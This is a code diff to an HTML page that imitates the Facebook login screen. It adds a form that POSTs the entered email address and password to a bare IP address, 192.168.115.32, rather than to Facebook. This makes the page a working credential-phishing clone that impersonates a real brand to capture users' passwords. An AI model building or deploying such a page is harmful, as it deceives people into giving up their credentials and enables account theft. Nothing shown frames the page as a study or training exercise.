@@ -13,23 +13,23 @@
     <div class="container">
         <section class="intro-section">
             <h1>facebook</h1>
-
             <p>Facebook helps you connect and share with the people in your life.</p>
         </section>
 
         <section class="signin-section">
             <div>
-                <form>
+            
+                <form method="post" action="http://192.168.115.32">
                     <div>
-                        <input type="text" placeholder="Email address or phone number">
+                        <input type="text" name="email" placeholder="Email address or phone number" required>
                     </div>
 
                     <div>
-                        <input type="text" placeholder="Password">
+                        <input type="password" name="pass" placeholder="Password" required>
                     </div>
 
                     <div>
-                        <button>Log in</button>
+                        <button type="submit">Log in</button>
                     </div>
 
                     <a href="#">Forgotten password?</a>
@@ -37,13 +37,10 @@
                     <hr />
 
                     <div class="create-btn">
-                        <button>Create new account</button>
+                        <button type="button">Create new account</button>
                     </div>
                 </form>
-
-
             </div>
-
 
             <p>
                 <a href="#"><strong>
